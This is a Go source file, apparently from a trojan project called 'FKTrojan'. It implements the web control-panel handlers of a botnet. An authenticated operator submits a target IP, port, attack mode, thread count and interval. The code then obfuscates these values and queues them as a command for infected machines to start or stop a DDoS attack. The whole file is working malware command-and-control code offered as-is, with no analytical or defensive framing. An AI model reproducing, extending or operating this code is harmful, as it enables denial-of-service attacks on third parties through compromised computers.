/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"fmt"
	"net/http"
	"strings"
)

//------------------------------------------------------------
func StartDDosHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		userName := GetUserName(request)
		if userName != "" {
			request.ParseForm()
			ddosmode := request.FormValue("ddosmode")
			ip := request.FormValue("ip")
			port := request.FormValue("port")
			threads := request.FormValue("threads")
			interval := request.FormValue("interval")
			fmt.Println(ddosmode, ip, port, threads, interval)
			if ddosmode == "" || ip == "" || port == "" || threads == "" || interval == "" {
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Somethings not right...")
				result := r.Replace(ErrorHTML)
				fmt.Fprintf(response, result)
			} else {
				tmpstring := "000|0x3|" + ddosmode + "|" + ip + ":" + port + "|" + threads + "|" + interval
				done := setCommand(common.Obfuscate(common.Base64Encode(tmpstring)))
				if done {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
					result := r.Replace(SuccessHTML)
					fmt.Fprintf(response, result)
				} else {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
					result := r.Replace(ErrorHTML)
					fmt.Fprintf(response, result)
				}
			}
		} else {
			fmt.Fprintf(response, LoginHTML)
		}
	}
}

//------------------------------------------------------------
func StopDDosHandler(response http.ResponseWriter, request *http.Request) {
	userName := GetUserName(request)
	if userName != "" {
		tmpstring := "000|0x4|"
		done := setCommand(common.Obfuscate(common.Base64Encode(tmpstring)))
		if done {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
			result := r.Replace(SuccessHTML)
			fmt.Fprintf(response, result)
		} else {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
			result := r.Replace(ErrorHTML)
			fmt.Fprintf(response, result)
		}
	} else {
		fmt.Fprintf(response, LoginHTML)
	}
}

//------------------------------------------------------------
